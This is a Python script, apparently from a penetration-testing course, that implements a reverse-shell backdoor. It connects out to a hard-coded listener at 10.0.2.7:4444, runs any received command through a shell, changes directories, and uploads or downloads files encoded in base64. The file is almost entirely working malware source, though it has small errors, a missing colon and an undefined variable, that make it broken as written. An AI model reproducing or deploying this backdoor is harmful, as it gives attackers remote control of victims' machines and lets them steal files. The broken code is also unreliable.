import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        #Listen on "nc -vv -l -p 4444" on Kali Machine OR use listener.py
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create Socket object
        self.connection.connect((ip, port)) #Kali Machine Ip and Port for listening

    def JSONSend(self, data): #Reliable Send
        jsonData = json.dumps(data)
        self.connection.send(jsonData)
        
    def JSONReceive(self): #Reliable Receive
        while True:
            try:
                jsonData = jsonData + self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def executeCommands(self, command): #Execute COmmands
        return subprocess.check_output(command, shell=True)

    def cdCommand(self, path): #Change working directory
        os.chdir(path)
        return "[+] Changing working directory to" + path

    def writeFile(self, path, content): #Write FIle
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def readFile(self, path): #Download File
        with open(path, "rb") as file: #read Binary of file
            return base64.b64encode(file.read())

    def run(self)
        while True: #Loop for show results
            command = self.JSONReceive()
            try:
                if command[0] == "exit": #For exiting
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    commandResult = self.cdCommand(command[1])
                elif command[0] == "download":
                    commandResult = self.readFile(command[1])
                elif command[0] == "upload":
                    commandResult = self.writeFile(command[1], command[2])
                else:
                    commandResult = self.executeCommands(command)
            except Exception:
                commandResult = "[-] Error during command execution."
            self.JSONSend(commandResult)    

myBackdoor = Backdoor("10.0.2.7", 4444)
myBackdoor.run()